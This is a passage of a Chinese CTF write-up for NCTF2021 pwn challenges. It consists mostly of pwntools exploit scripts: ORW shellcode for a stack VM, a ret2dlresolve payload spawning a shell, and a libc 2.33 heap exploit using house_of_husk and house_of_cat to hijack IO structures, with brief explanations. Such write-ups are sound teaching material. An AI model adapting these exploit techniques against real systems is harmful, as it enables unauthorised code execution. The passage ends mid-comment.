class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>e=ELF(<span class="hljs-string">&#x27;vmstack&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>e.address=<span class="hljs-number">0x555555554000</span><br>bss=e.bss(<span class="hljs-number">0x200</span>)<br>rdi=<span class="hljs-string">&#x27;rdi&#x27;</span><br>rsi=<span class="hljs-string">&#x27;rsi&#x27;</span><br>rax=<span class="hljs-string">&#x27;rax&#x27;</span><br>rdx=<span class="hljs-string">&#x27;rdx&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pop</span>(<span class="hljs-params">reg</span>):<br>    regs=[<span class="hljs-string">&#x27;rax&#x27;</span>,<span class="hljs-string">&#x27;rdi&#x27;</span>,<span class="hljs-string">&#x27;rsi&#x27;</span>,<span class="hljs-string">&#x27;rdx&#x27;</span>]<br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">5</span>+regs.index(reg)+<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">reg</span>):<br>    regs=[<span class="hljs-string">&#x27;rax&#x27;</span>,<span class="hljs-string">&#x27;rdi&#x27;</span>,<span class="hljs-string">&#x27;rsi&#x27;</span>,<span class="hljs-string">&#x27;rdx&#x27;</span>]<br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">1</span>+regs.index(reg))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0a&#x27;</span>+p64(data)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0b&#x27;</span>+p64(data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mov</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x00&#x27;</span>+p64(data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sys</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0c&#x27;</span><br><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">4444</span>)<br><br>shellcode=mov(<span class="hljs-number">0xc</span>)+pop(rax)+mov(<span class="hljs-number">0x1000</span>)+pop(rdi)+sys()<br> <span class="hljs-comment"># 通过 系统调用 brk 从系统中获取空间</span><br> <span class="hljs-comment"># 这样就可以获取 可以读写的空间地址了</span><br>shellcode+=push(rax)+sub(<span class="hljs-number">0x400</span>)<br>shellcode+=push(rax)+sub(<span class="hljs-number">0x400</span>)<br>shellcode+=push(rax)+sub(<span class="hljs-number">0x400</span>)<br>shellcode+=push(rax)+sub(<span class="hljs-number">0x400</span>)<br>shellcode+=pop(rsi)+mov(<span class="hljs-number">0</span>)+pop(rdi)+mov(<span class="hljs-number">4</span>)+pop(rdx)+mov(<span class="hljs-number">0</span>)+pop(rax)+sys()<br>shellcode+=pop(rdi)+mov(<span class="hljs-number">0</span>)+pop(rsi)+mov(<span class="hljs-number">0</span>)+pop(rdx)+mov(<span class="hljs-number">2</span>)+pop(rax)+sys()<br>shellcode+=pop(rsi)+mov(<span class="hljs-number">4</span>)+pop(rdi)+mov(<span class="hljs-number">0x40</span>)+pop(rdx)+mov(<span class="hljs-number">0</span>)+pop(rax)+sys()<br>shellcode+=pop(rsi)+mov(<span class="hljs-number">1</span>)+pop(rdi)+mov(<span class="hljs-number">0x40</span>)+pop(rdx)+mov(<span class="hljs-number">1</span>)+pop(rax)+sys()<br> <span class="hljs-comment"># 利用 ORW 获取flag</span><br>p.sendline(shellcode)<br>p.sendline(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="login">login</h2><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-login.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-login-1.jpg" srcset="/img/loading.gif" lazyload alt="dynamic段内容" title="dynamic段内容"></p><p>程序关闭了输出流，只能输入，那么只能使用<code>ret2dl</code>来做</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;login&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>edit=<span class="hljs-number">0x4011ed</span><br>leave=<span class="hljs-number">0x40121f</span><br>rdi=<span class="hljs-number">0x401293</span><br>close=e.got[<span class="hljs-string">&#x27;close&#x27;</span>]<br>bss=e.bss(<span class="hljs-number">0xf88</span>)<br>rel=<span class="hljs-number">0x4005d0</span><br>sym=<span class="hljs-number">0x3ff418</span><br>relstr=<span class="hljs-number">0x3ff388</span><br><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1:4444&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>+p64(bss)+p64(edit))<br>bss=bss-<span class="hljs-number">0x100</span>+<span class="hljs-number">0x50</span><br>n=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> ((n+bss+<span class="hljs-number">0x30</span>-rel)//<span class="hljs-number">0x18</span>) != (n+<span class="hljs-number">0x30</span>+bss-rel)*<span class="hljs-number">1.0</span>/<span class="hljs-number">0x18</span>:<br>    n=n+<span class="hljs-number">8</span><br><span class="hljs-comment"># 计算偏移</span><br><br>fake_dnystr=p64(<span class="hljs-number">0</span>)*(n//<span class="hljs-number">8</span>)+<span class="hljs-string">&#x27;system\x00\x00&#x27;</span> <span class="hljs-comment"># bss+0x50</span><br>f_str=bss+n+<span class="hljs-number">0x28</span><br>fake_rel=p64(close)+ p32(<span class="hljs-number">0x7</span>) + p32((f_str+<span class="hljs-number">0x38</span>-sym)//<span class="hljs-number">0x18</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>fake_sym=p32(f_str-relstr)+p32(<span class="hljs-number">0x12</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># bss+0x60</span><br>fake=fake_dnystr+fake_rel+fake_sym<br><span class="hljs-comment"># 构造虚假的表</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span>+<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(rdi)+p64(bss+<span class="hljs-number">0x48</span>+<span class="hljs-number">0x60</span>)+p64(<span class="hljs-number">0x401020</span>)<br>payload+=p64((f_str+<span class="hljs-number">0x8</span>-rel)//<span class="hljs-number">0x18</span>) <br>payload+=p64(<span class="hljs-number">0x401196</span>) <br>payload+=fake.ljust(<span class="hljs-number">0xb0</span>-<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>payload+=p64(bss-<span class="hljs-number">8</span>)+p64(leave)<br><span class="hljs-comment"># 构造payload 通过 _dl_runtime_resolve 执行system(&quot;/bin/sh&quot;);</span><br>p.send(payload)<br>p.sendline(<span class="hljs-string">&#x27;exec 1&gt;&amp;0&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="house-of-fmyyass">house_of_fmyyass</h2><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-house_of_fmyyass.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-house_of_fmyyass-1.jpg" srcset="/img/loading.gif" lazyload alt="create函数代码" title="create函数代码"></p><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-house_of_fmyyass-2.jpg" srcset="/img/loading.gif" lazyload alt="edit函数代码" title="edit函数代码"></p><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-house_of_fmyyass-3.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-house_of_fmyyass-4.jpg" srcset="/img/loading.gif" lazyload alt="show函数代码" title="show函数代码"></p><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-house_of_fmyyass-5.jpg" srcset="/img/loading.gif" lazyload alt="main_init函数代码" title="main_init函数代码"></p><p>函数在开始的时候使用<code>mmap</code>创建了一个空间，作为伪造的堆空间，<code>delete函数</code>可以释放伪造的<code>heap段</code>中的<code>chunk</code>，<code>edit</code>可以随意修改伪造的<code>heap段</code>中的数据，<code>create函数</code>通过<code>calloc函数</code>创建<code>chunk</code>，无法通过<code>tcache bin attach</code>修改任意地址，且每次调用都会刷新<code>buf</code>变量指向的地址，<code>show</code>可以获取<code>buf</code>当前指向的空间的数据</p><p>每次执行<code>menu函数</code>时都会检测<code>malloc_hook</code>与<code>free_hook</code>，所以想要利用这两个<code>hook</code>获取<code>flag</code>的可能性没有了，因为在程序中只能随意修改伪造的<code>heap</code>段中的数据，且程序中都是调用<code>_exit函数</code>，所以<code>exit_hook</code>也不能用，那只能通过<code>IO结构体</code>攻击，我是用<code>house_of_husk</code>和<code>house_of_cat</code>进行攻击的，先使用<code>house_of_husk</code>，修改<code>__printf_function_table</code>和<code>__printf_arginfo_table</code>为伪造的<code>heap段</code>中的数据，使<code>__printf_arginfo_table['s']</code>处储存<code>_IO_cleanup</code>函数地址，执行<code>_IO_flush_all_lockp</code>,遍历<code>IO_list_all</code>中的<code>IO结构体</code>，执行这些<code>IO结构体</code>中<code>vtable</code>指向的<code>overflow项</code>，然后再使用<code>house_of_cat</code>，需要先构造一个<code>fake_io</code>，在伪造的<code>heap</code>段中，且要让<code>IO_list_all</code>中储存<code>fake_io</code>的地址，上面所有要修改的变量，都可以使用<code>large bin attach</code>进行修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>libc=ELF(<span class="hljs-string">&#x27;libc-2.33.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>c_l=[]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,size,text,heap=<span class="hljs-number">0</span>,off=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,ind):<br>        off+=c_l[i]<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;offset: &#x27;</span>,<span class="hljs-built_in">str</span>(off))<br>    p.sendlineafter(<span class="hljs-string">&#x27;content: &#x27;</span>,text)<br>    <span class="hljs-keyword">if</span> heap:<br>        c_l.append(size)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit1</span>(<span class="hljs-params">off,size,text</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;offset: &#x27;</span>,<span class="hljs-built_in">str</span>(off))<br>    p.sendlineafter(<span class="hljs-string">&#x27;content: &#x27;</span>,text)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    off=<span class="hljs-number">0x10</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,ind):<br>            off+=c_l[i]<br>    <span class="hljs-built_in">print</span>(c_l)<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx: &#x27;</span>,<span class="hljs-built_in">str</span>(off))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_mmap</span>(<span class="hljs-params">addr</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        因为在libc2.33中单向链表中的fd是被加密的</span><br><span class="hljs-string">        但只要知道fd要指向的chunk的低12位是什么</span><br><span class="hljs-string">        就可以解密得到整个chunk地址</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    h_a=<span class="hljs-built_in">hex</span>(addr)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>)<br>    real_add=h_a[:<span class="hljs-number">3</span>]<br>    h_a=h_a[<span class="hljs-number">3</span>:]<br>    e=[]<br>    h_c=[]<br>    h_a=h_a[::-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(h_a),<span class="hljs-number">3</span>):<br>        h_c.append(h_a[i:i+<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> h_c:<br>        <span class="hljs-keyword">if</span> e==[]:<br>            e.append(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)^<span class="hljs-number">0x180</span>)[<span class="hljs-number">2</span>:])<br>        <span class="hljs-keyword">else</span>:<br>            l=<span class="hljs-built_in">len</span>(i)<br>            e.append(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(e[-<span class="hljs-number">1</span>][<span class="hljs-number">3</span>-l:],<span class="hljs-number">16</span>)^<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>))[<span class="hljs-number">2</span>:])<br>    e=e[::-<span class="hljs-number">1</span>]<br>    real_add=<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(e),<span class="hljs-number">16</span>)&lt;&lt;<span class="hljs-number">12</span><br>    <span class="hljs-keyword">return</span> real_add<br><br>p=process(<span class="hljs-string">&#x27;house_of_fmyyass&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">#30</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">#30</span><br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">#30</span><br>edit(<span class="hljs-number">3</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">#30</span><br>edit(<span class="hljs-number">4</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">#30</span><br>edit(<span class="hljs-number">5</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">#30</span><br>edit(<span class="hljs-number">6</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">#30</span><br>edit(<span class="hljs-number">7</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">#30</span><br>edit(<span class="hljs-number">8</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">#30</span><br>edit(<span class="hljs-number">9</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">#30</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">5</span>)<br>free(<span class="hljs-number">6</span>) <span class="hljs-comment"># 将tcache bin填满</span><br><br>free(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x28</span>)<br>free(<span class="hljs-number">8</span>)<br>free(<span class="hljs-number">7</span>)<br><br>c_l=c_l[:-<span class="hljs-number">3</span>]<br>show()<br>p.readuntil(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;1. alloc&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>fake_heap=calc_mmap(d)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(fake_heap)) <span class="hljs-comment"># 先获取fake heap空间地址</span><br>add(<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">0x28</span>)<br>edit(<span class="hljs-number">7</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">8</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x28</span>)<br>c_l=c_l[:-<span class="hljs-number">2</span>]<br><br>edit(<span class="hljs-number">7</span>,<span class="hljs-number">0x430</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x431</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>+p64(<span class="hljs-number">0x31</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>+p64(<span class="hljs-number">0x31</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">8</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">9</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>)<br><br>free(<span class="hljs-number">7</span>)<br>show() <br><br>p.read(<span class="hljs-number">9</span>)<br>main_arena=<span class="hljs-number">0</span><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br>data=p.read(<span class="hljs-number">8</span>)<br>p.readuntil(<span class="hljs-string">&#x27;exit&#x27;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;1. &#x27;</span> <span class="hljs-keyword">in</span> data:<br>    <span class="hljs-string">&quot;&quot;&quot; </span><br><span class="hljs-string">        当chunk的fd的第一个字节为0时需要使用这种方法获取libc地址</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    edit(<span class="hljs-number">7</span>,<span class="hljs-number">0x430</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x431</span>)+<span class="hljs-string">&#x27;a&#x27;</span>)<br>    show()<br>    p.read(<span class="hljs-number">9</span>)<br>    main_arena=u64((<span class="hljs-string">b&#x27;\x00&#x27;</span>+p.read(<span class="hljs-number">6</span>)[<span class="hljs-number">1</span>:]).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x60</span><br>    edit(<span class="hljs-number">7</span>,<span class="hljs-number">0x430</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x431</span>)+<span class="hljs-string">&#x27;\x00&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    main_arena=u64(data[:data.find(<span class="hljs-string">&#x27;\x7f&#x27;</span>)+<span class="hljs-number">1</span>])-<span class="hljs-number">0x60</span><br><br>malloc_hook=main_arena-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>top_chunk=main_arena+<span class="hljs-number">0x60</span><br>wfile_jump=libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>func_table=libc.address+<span class="hljs-number">0x1e35c8</span><br>arg_table=libc.address+<span class="hljs-number">0x1eb218</span><br>io_list_all=libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>gadget=libc.address+<span class="hljs-number">0x8ef80</span><br><br><br>add(<span class="hljs-number">0x428</span>)<br><br><br>fake_io_add=fake_heap+<span class="hljs-number">0x440</span>+<span class="hljs-number">0x30</span>+<span class="hljs-number">0x450</span>+<span class="hljs-number">0x30</span>+<span class="hljs-number">0x30</span><br><br>fake_io=p64(<span class="hljs-number">0x68732f6e69622f</span>)+\<br>    p64(<span class="hljs-number">0</span>)+p64(system)+p64(system)+\<br>    p64(system+<span class="hljs-number">1</span>)+p64(system+<span class="hljs-number">3</span>)+p64(system+<span class="hljs-number">2</span>)+\<br>    p64(system+<span class="hljs-number">5</span>)+p64(<span class="hljs-number">0</span>)+\<br>    p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+\<br>    p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+\<br>    p16(<span class="hljs-number">0</span>)+p8(<span class="hljs-number">0</span>)+p8(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+\<br>    p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(fake_io_add+<span class="hljs-number">0x8</span>)+\<br>    p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p8(<span class="hljs-number">0</span>)*<span class="hljs-number">20</span>+\<br>    p64(wfile_jump+<span class="hljs-number">0x30</span>)+\<br>    p64(<span class="hljs-number">0</span>)+p64(fake_io_add)<br><span class="hljs-comment"># 构造 house of 